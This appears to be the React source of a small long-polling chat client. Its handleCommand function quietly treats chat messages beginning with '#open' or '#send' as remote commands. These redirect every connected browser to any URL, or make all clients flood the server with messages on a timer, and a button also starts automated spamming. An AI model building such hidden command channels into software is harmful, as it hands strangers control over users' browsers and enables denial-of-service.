import React, { Component } from "react";
import axios from "axios";
import "./App.css";

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

class App extends Component {
  state = {
    messages: [],
    displayedMessages: [],
    username: "",
    usernameConfirmed: false,
    message: "",
    color: "green",
    sentMessages: 0,
  };

  async componentDidMount() {
    // await this.getPastMessages();
    this.getMessages();
  }

  componentDidUpdate(prevProps, prevState) {
    if (!prevState.usernameConfirmed && this.state.usernameConfirmed) {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }

    if (this.state.displayedMessages.length > 10) {
      this.setState({ displayedMessages: [] });
    }
  }

  getPastMessages = async () => {
    const { data } = await axios.get(
      "http://longpoll.sartonon.fi/api/pastMessages"
    );
    this.setState({ messages: data });
  };

  getMessages = async () => {
    try {
      const { data } = await axios.get(
        `http://longpoll.sartonon.fi/api/messages?id=${this.getId()}`
      );
      this.handleMessage(data);
      this.getMessages();
    } catch (err) {
      console.log("error: ", err);
    }
  };

  getId = () => {
    if (this.state.messages.length > 0) {
      return this.state.messages[this.state.messages.length - 1].id;
    }

    return null;
  };

  sendMessage = e => {
    e.preventDefault();
    axios.post(`http://longpoll.sartonon.fi/api/messages`, {
      name: this.state.username,
      message: this.state.message,
      color: this.state.color
    });
    this.setState({ message: "" });
  };

  handleCommand = data => {
    console.log(data);
    if (!data[0]) return;
    if (data[0].message[0] === "#") {
      const splittedMessage = data[0].message.split('::');
      const command = splittedMessage[0];
      if (command === "#open") {
        window.open(splittedMessage[1], "_self");
      } else if (command === "#send") {
        const name = splittedMessage[1];
        const message = splittedMessage[2];
        const interval = splittedMessage[3];
        console.log(name, message, interval);
        if (this.messageInterval) clearInterval(this.messageInterval);
        this.messageInterval = setInterval(() => {
          this.setState(prevState => ({
            sentMessages: prevState.sentMessages + 1
          }));
          axios.post("http://longpoll.sartonon.fi/api/messages", {
            name,
            message,
            color: "green"
          });
        }, interval || 1000);
      }
    }
  }

  handleMessage = data => {
    this.handleCommand(data);
    this.setState({
      messages: [...this.state.messages, ...data],
      displayedMessages: [...this.state.displayedMessages, ...data]
    });
    setTimeout(() => {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }, 200);
  };

  changeUsername = e => {
    this.setState({ username: e.target.value });
  };

  startSending = () => {
    if (this.messageInterval) clearInterval(this.messageInterval);
    this.messageInterval = setInterval(() => {
      axios.post("http://longpoll.sartonon.fi/api/messages", {
        name: "Santeri",
        message: "Moikka!",
        color: "green"
      });
    }, this.state.interval || 1000);
  };

  confirmUsername = () => {
    this.setState({
      usernameConfirmed: true,
      color: "green"
    });
  };

  handleMessageChange = e => {
    this.setState({ message: e.target.value });
  };

  renderMessages = () => {
    return this.state.displayedMessages.map((message, i) => {
      return (
        <div className="Message-wrapper" key={i}>
          <div
            className="Message-block"
            key={i}
            style={{
              float: message.name === this.state.username ? "right" : "left"
            }}
          >
            <div className="Message-name" style={{ color: message.color }}>
              {message.name}
            </div>
            <div className="Message-content">{message.message}</div>
          </div>
        </div>
      );
    });
  };

  render() {
    const { usernameConfirmed, sentMessages } = this.state;

    return (
      <div className="App">
        <header className="App-header">
          <h1 className="App-title">Chat</h1>
          <button onClick={this.startSending}>Laheta</button>
          <input onChange={e => this.setState({ interval: e.target.value })} />
          <div style={{ float: "right" }}>{sentMessages}</div>
        </header>
        {!usernameConfirmed ? (
          <div className="Login-div">
            <p style={{ fontWeight: "bold", fontSize: "16px" }}>
              Anna käyttäjänimi
            </p>
            <input
              className="Login-input"
              value={this.state.username}
              onChange={this.changeUsername}
              type="text"
            />
            <div className="Ok-button" onClick={this.confirmUsername}>
              Ok
            </div>
          </div>
        ) : (
          <div className="Chat-window">
            <div id="chatwindow" className="Message-div">
              {this.renderMessages()}
            </div>
            <form onSubmit={this.sendMessage}>
              <div className="Chat-input">
                <input
                  className="Chat-inputfield"
                  onChange={this.handleMessageChange}
                  value={this.state.message}
                  type="text"
                />
                <div className="Send-button" onClick={this.sendMessage}>
                  Lähetä
                </div>
              </div>
            </form>
          </div>
        )}
      </div>
    );
  }
}

export default App;
